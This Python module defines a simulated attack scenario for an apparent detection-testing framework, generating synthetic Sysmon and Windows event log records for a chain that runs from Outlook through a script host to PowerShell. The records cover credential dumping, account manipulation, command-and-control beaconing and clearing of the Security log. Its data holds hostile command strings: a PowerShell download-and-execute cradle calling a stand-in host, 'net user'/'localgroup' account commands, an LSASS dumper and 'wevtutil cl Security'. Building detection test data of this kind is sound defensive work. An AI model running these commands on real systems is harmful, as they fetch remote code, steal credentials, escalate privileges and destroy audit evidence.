"""storyline_outlook_script_backdoor -- a mail-borne script: Outlook starts a Windows Script Host, whose
PowerShell reads LSASS, creates and deletes a throw-away account, adds the stolen account to a local
administrators group, starts an implant that beacons out, and clears the Security log.

Registered by ``scenario_registry._discover`` (module name ``storyline_*``, exports ``STORYLINE``).

    lolbin_shell -> ps_cradle -> lsass_read -> ephemeral_account -> group_add -> c2_beacon -> log_clear

WHY IT EXISTS (ADR-011 n gap, ADR-012 WP 7). The account-manipulation shape of the keyed family: the two
Windows-log steps ``ephemeral_account`` (4720 then 4726 on one target: ``common_rapid_account_lifecycle``)
and ``group_add`` (4732: ``common_priv_grant``) each have a ``net.exe`` child of the PowerShell as their
process-tree evidence, and the implant that beacons is a different child of the same PowerShell, so the
tree is a star of seven steps around one process whose OWN step (``ps_cradle``) is a Windows-log step.

PROCESS TREE (one workstation; ``P`` = the PowerShell the script host starts)

    explorer -> OUTLOOK -> wscript -> P --+--> recon children               (ps_cradle)
                                          +--> dumper --EID10--> lsass          (lsass_read)
                                          +--> net.exe user /add, /delete       (ephemeral_account)
                                          +--> net.exe localgroup               (group_add)
                                          +--> implant --EID3 x N--> C2         (c2_beacon)
                                          +--> wevtutil                         (log_clear)

TELEMETRY. Real parsers: ``sysmon`` (EID 1, 3, 10) and ``windows_eventlog`` (4104, 4720, 4726, 4732,
1102). No dependency gaps (``parse_expected=True`` everywhere).

STRUCTURE VARIES WITH THE SEED: account, workstation, address, throw-away account name, script-block
count (1-3), beacon count (20-23), the C2 address and the dropped tool names.

SAFETY. Simulation only: ``.invalid`` names, documentation / private addresses, a fixed calendar epoch.
"""
from __future__ import annotations

import sys
from pathlib import Path
from random import Random

TWIN = Path(__file__).resolve().parent
if str(TWIN) not in sys.path:
    sys.path.insert(0, str(TWIN))

from scenario import ChainStepSpec, ScenarioDef  # noqa: E402
from scenario_kit import BASE_MS  # noqa: E402
from sysmon_tree import Emitter, Host  # noqa: E402

TAG = "osb"

STEPS: tuple[ChainStepSpec, ...] = (
    ChainStepSpec("lolbin_shell", "sysmon", True,
                  "Outlook starts a Windows Script Host (a document host spawns a script host)"),
    ChainStepSpec("ps_cradle", "windows_eventlog", True,
                  "the script host's PowerShell logs a download-and-execute cradle"),
    ChainStepSpec("lsass_read", "sysmon", True,
                  "a dumper started by that PowerShell opens lsass.exe with a memory-read mask"),
    ChainStepSpec("ephemeral_account", "windows_eventlog", True,
                  "a local account is created and deleted again within minutes"),
    ChainStepSpec("group_add", "windows_eventlog", True,
                  "the stolen account is added to the local Administrators group"),
    ChainStepSpec("c2_beacon", "sysmon", True,
                  "the implant started by the PowerShell makes regular-interval outbound connections"),
    ChainStepSpec("log_clear", "windows_eventlog", True,
                  "the Security event log is cleared"),
)
DECOY_STEPS: tuple[ChainStepSpec, ...] = (
    ChainStepSpec("decoy_account_churn", "windows_eventlog", True,
                  "a helpdesk administrator adds a new hire to a local group on a file server (BENIGN)"),
)

_ACCOUNTS = ("d.sales", "w.support", "y.planning", "z.ops")
_WKS = ("wks-sal-33", "wks-sup-11", "wks-pln-05", "wks-ops-41")
_TOOLS = ("lsadump.exe", "mdmpx.exe", "wcdump.exe")
_IMPLANTS = ("OneDriveSync.exe", "chromeupd.exe", "teamsagent.exe")
_C2 = ("203.0.113.88", "198.51.100.9", "203.0.113.150")
_CRADLE = "powershell -nop -w hidden -c IEX ((New-Object Net.WebClient).DownloadString('http://x.example.invalid/p'))"
_PS_CHANNEL = "Microsoft-Windows-PowerShell/Operational"
_SYS = "C:\\Windows\\System32\\"
_OFFICE = "C:\\Program Files\\Microsoft Office\\root\\Office16\\"


def build(seed: int):
    rng = Random(seed * 1299791 + 79)
    user = rng.choice(_ACCOUNTS)
    wks_name = rng.choice(_WKS)
    ip = f"10.47.{rng.randint(1, 9)}.{rng.randint(20, 200)}"
    tool = rng.choice(_TOOLS)
    implant_name = rng.choice(_IMPLANTS)
    c2 = rng.choice(_C2)
    ghost = f"svc-{rng.randint(1000, 9999)}"
    n_ps = 1 + seed % 3
    n_beats = 20 + seed % 4

    wks = Host(wks_name, ip, seed)
    em = Emitter(seed, TAG, STEPS)
    notes: dict = {}

    def add(label: str, source_type: str, raw: dict, ts: int) -> None:
        em.add(label, source_type, raw, ts, ip)

    t0 = BASE_MS
    explorer = wks.proc("C:\\Windows\\explorer.exe", "explorer.exe", user, t0 - 1_000)
    outlook = wks.proc(_OFFICE + "OUTLOOK.EXE", "\"OUTLOOK.EXE\"", user, t0, explorer)
    wscript = wks.proc(_SYS + "wscript.exe", "wscript.exe C:\\Users\\Public\\invoice.js", user, t0 + 5_000, outlook)
    ps = wks.proc(_SYS + "WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe -nop -w hidden", user, t0 + 11_000, wscript)
    recon = [wks.proc(_SYS + exe, c, user, t0 + 16_000 + i * 1_000, ps) for i, (exe, c) in enumerate((
        ("whoami.exe", "whoami /priv"), ("hostname.exe", "hostname"), ("net.exe", "net localgroup administrators")))]
    t_ps = t0 + 25_000
    dumper = wks.proc(f"C:\\Users\\Public\\{tool}", f"{tool} lsass", user, t_ps + 45_000, ps)
    lsass = wks.proc(_SYS + "lsass.exe", "lsass.exe", "SYSTEM", t0 - 7_200_000)
    net_add = wks.proc(_SYS + "net.exe", f"net.exe user {ghost} P@ssw0rd! /add", user, t_ps + 100_000, ps)
    net_grp = wks.proc(_SYS + "net.exe", f"net.exe localgroup Administrators {user} /add", user, t_ps + 200_000, ps)
    implant = wks.proc(f"C:\\Users\\Public\\{implant_name}", implant_name, user, t_ps + 240_000, ps)
    wevt = wks.proc(_SYS + "wevtutil.exe", "wevtutil.exe cl Security", user, t_ps + 700_000, ps)

    for p in (explorer, outlook, wscript):
        add("lolbin_shell", "sysmon", p.create_record(), p.start_ms)
    notes["lolbin_shell"] = f"{user} on {wks_name}: OUTLOOK -> wscript.exe"

    add("ps_cradle", "sysmon", ps.create_record(), ps.start_ms)
    for p in recon:
        add("ps_cradle", "sysmon", p.create_record(), p.start_ms)
    for i in range(n_ps):
        ts = t_ps + i * 10_000
        add("ps_cradle", "windows_eventlog",
            {"EventID": 4104, "Channel": _PS_CHANNEL, "ProviderName": "Microsoft-Windows-PowerShell",
             "Computer": wks_name, "SubjectUserName": user, "SubjectDomainName": "CORP",
             "ScriptBlockText": _CRADLE, "TimeCreated": ts}, ts)
    notes["ps_cradle"] = f"{n_ps} script-block event(s) on {wks_name}"

    add("lsass_read", "sysmon", dumper.create_record(), dumper.start_ms)
    t_acc = dumper.start_ms + 5_000
    add("lsass_read", "sysmon", dumper.access_record(t_acc, lsass.image, lsass.guid, lsass.pid, "0x1010"), t_acc)
    notes["lsass_read"] = f"{tool} opens lsass.exe with GrantedAccess 0x1010"

    add("lsass_read", "sysmon", net_add.create_record(), net_add.start_ms)
    t_new = net_add.start_ms + 3_000
    t_del = t_new + 50_000
    for eid, ts in ((4720, t_new), (4726, t_del)):
        add("ephemeral_account", "windows_eventlog",
            {"EventID": eid, "Computer": wks_name, "SubjectUserName": user, "SubjectDomainName": "CORP",
             "TargetUserName": ghost, "TargetDomainName": wks_name, "TimeCreated": ts}, ts)
    notes["ephemeral_account"] = f"{user} creates then deletes {ghost} on {wks_name}"

    add("group_add", "sysmon", net_grp.create_record(), net_grp.start_ms)
    t_grp = net_grp.start_ms + 4_000
    add("group_add", "windows_eventlog",
        {"EventID": 4732, "Computer": wks_name, "SubjectUserName": user, "SubjectDomainName": "CORP",
         "TargetUserName": "Administrators", "TargetDomainName": wks_name, "MemberName": user,
         "TimeCreated": t_grp}, t_grp)
    notes["group_add"] = f"{user} added to Administrators on {wks_name}"

    add("c2_beacon", "sysmon", implant.create_record(), implant.start_ms)
    t_b = implant.start_ms + 30_000
    for i in range(n_beats):
        ts = t_b + i * 15_000 + (rng.randint(-500, 500) if i else 0)
        add("c2_beacon", "sysmon", implant.connect_record(ts, c2, 443, 49_400 + i), ts)
    notes["c2_beacon"] = f"{n_beats} connections from {implant_name} to {c2}:443"

    add("log_clear", "sysmon", wevt.create_record(), wevt.start_ms)
    t_clr = wevt.start_ms + 3_000
    add("log_clear", "windows_eventlog",
        {"EventID": 1102, "Channel": "Security", "ProviderName": "Microsoft-Windows-Eventlog",
         "Computer": wks_name, "SubjectUserName": user, "SubjectDomainName": "CORP",
         "TimeCreated": t_clr}, t_clr)
    notes["log_clear"] = f"{user} clears the Security log on {wks_name}"
    return em.payloads, {}, notes, None


def _build_decoys(seed: int) -> list:
    spec = DECOY_STEPS[0]
    em = Emitter(seed, TAG + "d", DECOY_STEPS)
    ts = BASE_MS + 50_000
    em.add(spec.label, "windows_eventlog",
           {"EventID": 4732, "Computer": "fs04", "SubjectUserName": "helpdesk.adm", "SubjectDomainName": "CORP",
            "TargetUserName": "Remote Desktop Users", "TargetDomainName": "FS04", "MemberName": "n.newhire",
            "TimeCreated": ts}, ts, "10.48.0.6")
    return em.payloads


STORYLINE = ScenarioDef(
    name="outlook_script_backdoor",
    steps=STEPS,
    build=build,
    oracle_path=TWIN / "oracle_outlook_script_backdoor.yaml",
    summary="Outlook -> wscript -> PowerShell on one workstation (Sysmon process tree), LSASS read, throw-away "
            "account, local-admin add, implant beacon, Security log cleared",
    decoy=_build_decoys,
    decoy_steps=DECOY_STEPS,
)
